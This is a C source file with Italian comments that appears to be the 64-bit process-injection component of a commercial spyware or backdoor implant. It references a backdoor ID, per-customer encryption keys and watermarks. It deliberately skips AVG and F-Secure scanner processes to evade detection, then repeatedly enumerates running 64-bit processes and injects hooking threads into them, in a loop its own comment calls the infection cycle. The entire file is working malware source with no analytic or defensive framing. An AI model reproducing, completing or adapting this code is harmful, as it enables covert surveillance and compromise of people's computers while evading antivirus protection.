
#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <Tlhelp32.h>

#include "Common.h"
#include "Hooking.h"
#include "DriverAccess.h"

// Variabili condivise per l'hooking thread
#pragma bss_seg("shared")
WCHAR g_directory_name[MAX_RAND_NAME];
WCHAR g_installer_name[MAX_RAND_NAME];
WCHAR g_registry_key_name[MAX_RAND_NAME];
DWORD g_core_pid;
char SHARE_MEMORY_READ_NAME[MAX_RAND_NAME];
char SHARE_MEMORY_WRITE_NAME[MAX_RAND_NAME];
#pragma bss_seg()
#pragma comment(linker, "/section:shared,RWS")

WCHAR *process_bypassed[] = {L"avgscanx64.exe", 
                             L"fsscoepl_x64.exe", 
							 NULL };

void SetGlobalVariables()
{
	HANDLE hfile;

	// Recupera il nome della directory dove si trova il core
	WCHAR module_path[MAX_PATH];
	ZeroMemory(g_directory_name, sizeof(g_directory_name));
	if (FindModulePath(module_path, sizeof(module_path))) {
		WCHAR *dir_ptr;
		if (dir_ptr = wcsrchr(module_path, L'\\'))
			*dir_ptr = 0;
		if (dir_ptr = wcsrchr(module_path, L'\\'))
			wcscpy(g_directory_name, dir_ptr+1);
	}

	// La chiave nel registry la deriva dalla directory
	_snwprintf_s(g_registry_key_name, MAX_RAND_NAME, _TRUNCATE, L"%S", BIN_PATCHED_REGISTRY_KEY);

	// Il nome dell'installer vmware e' lo stesso della directory
	_snwprintf_s(g_installer_name, MAX_RAND_NAME, _TRUNCATE, L"%s.exe", g_directory_name);

	// Recupera il PID del core
	g_core_pid = GetParentPid(GetCurrentProcessId()); 

	// Genera i nomi della shared memory in base al watermark per-cliente
	BYTE *temp_arr = (BYTE *)WATERMARK;
	BYTE ckey_arr[16];
	for (int j=0; j<16; j++)
		ckey_arr[j] = temp_arr[j];
	ckey_arr[8] = 0;
	_snprintf_s(SHARE_MEMORY_READ_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);
	ckey_arr[7] = 0;
	_snprintf_s(SHARE_MEMORY_WRITE_NAME, MAX_RAND_NAME, _TRUNCATE, "%s", ckey_arr);

	// Handle per verificare se un processo ha gia' la sharedmem (e' gia' hookato)
	if (hfile = OpenFileMapping(FILE_MAP_ALL_ACCESS, FALSE, SHARE_MEMORY_READ_NAME))
		IPC_SHM_Kernel_Object = FindTokenObject(hfile);

	// Inseriti solo per usarli
	char dummy[256];
	_snprintf_s(dummy, 50, _TRUNCATE, "%s", CLIENT_KEY);
	_snprintf_s(dummy, 50, _TRUNCATE, "%s", ENCRYPTION_KEY);
	_snprintf_s(dummy, 50, _TRUNCATE, "%s", ENCRYPTION_KEY_CONF);
	_snprintf_s(dummy, 50, _TRUNCATE, "%s", BACKDOOR_ID);
	_snprintf_s(dummy, 50, _TRUNCATE, "%s", DEMO_TAG);
}

// Accetta sia il nome che il path del processo
BOOL IsToBypass(WCHAR *p_name)
{
	WCHAR *name_offs;
	DWORD i;

	// Prende il nome nel caso abbia ricevuto un path
	name_offs = wcsrchr(p_name, L'\\');
	if (!name_offs)
		name_offs = p_name;
	else
		name_offs++;

	// Lo confronta con i processi da bypassare
	for (i=0; process_bypassed[i]; i++) {
		if (!_wcsicmp(name_offs, process_bypassed[i])) {
			return TRUE;
		}
	}
	return FALSE;
}

typedef BOOL (WINAPI *PeekMessage_t)(LPMSG, HWND, UINT, UINT, UINT);
void HandleMessages()
{
	static PeekMessage_t pPeekMessage = NULL;
	MSG sm_msg; 
	HMODULE	huser;

	if (!pPeekMessage) {
		if (!(huser = LoadLibraryW(L"User32.dll")))
			return;
		if (!(pPeekMessage = (PeekMessage_t)GetProcAddress(huser, "PeekMessageA")))
			return;
	}
	
	pPeekMessage(&sm_msg, NULL, 0, 0, PM_REMOVE);
}

// Ciclo principale di infezione
#define HM_PTSLEEPTIME 500
void StartPolling(void)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32W pe32;
	DWORD wait_time;

	LOOP {
		wait_time = HM_PTSLEEPTIME;
		pe32.dwSize = sizeof( PROCESSENTRY32W );
		if ( (hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 )) != INVALID_HANDLE_VALUE ) {
			if( Process32FirstW( hProcessSnap, &pe32 ) ) {	
				// Cicla la lista dei processi attivi
				do {
					// Tenta di infettare solo i processi a 64bit (diversi dal nostro!)
					if (pe32.th32ProcessID==GetCurrentProcessId() || !IsX64Process(pe32.th32ProcessID))
						continue;

					// Vede se e' in bypass e non e' di system
					if (IsToBypass(pe32.szExeFile) || !IsMyProcess(pe32.th32ProcessID))
						continue;

					// Se e' ok lo infetta (lo fara' solo la prima volta)
					if (StartHookingThread(pe32.th32ProcessID))
						wait_time = HM_PTSLEEPTIME*4;

				} while( Process32NextW( hProcessSnap, &pe32 ) );
			}
			CloseHandle( hProcessSnap );
		}
		HandleMessages();
		Sleep(wait_time);
	} 
}


// Funzione main eseguita da rundll32 64bit
void __stdcall H64_sMain(void)
{
	SetGlobalVariables();
	//GetAdmin(GetCurrentProcessId());
	//GetAdmin(g_core_pid);
	StartPolling();
}
